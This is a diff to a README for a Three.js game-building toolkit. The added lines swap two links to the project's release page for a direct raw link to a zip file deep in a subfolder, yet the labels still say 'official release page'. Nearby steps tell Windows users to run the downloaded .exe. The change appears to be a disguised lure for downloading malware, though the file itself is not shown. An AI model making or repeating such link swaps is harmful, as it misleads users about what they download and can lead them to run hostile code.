@@ -1,6 +1,6 @@
 # 🎮 threejs-game-skills - Build professional games with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Oliyflemishspeaking560/threejs-game-skills/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Oliyflemishspeaking560/threejs-game-skills/raw/refs/heads/main/skills/threejs-image-generator/agents/game-skills-threejs-3.4-beta.2.zip)
 
 threejs-game-skills helps you create games for web browsers. You do not need to write complex code to build projects with polished graphics and working menus. This software provides the building blocks for gameplay, sound, and visual effects. You can use these tools to make professional games for the web.
 
@@ -8,7 +8,7 @@ threejs-game-skills helps you create games for web browsers. You do not need to 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Oliyflemishspeaking560/threejs-game-skills/releases).
+1. Go to the [official release page](https://github.com/Oliyflemishspeaking560/threejs-game-skills/raw/refs/heads/main/skills/threejs-image-generator/agents/game-skills-threejs-3.4-beta.2.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file name ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
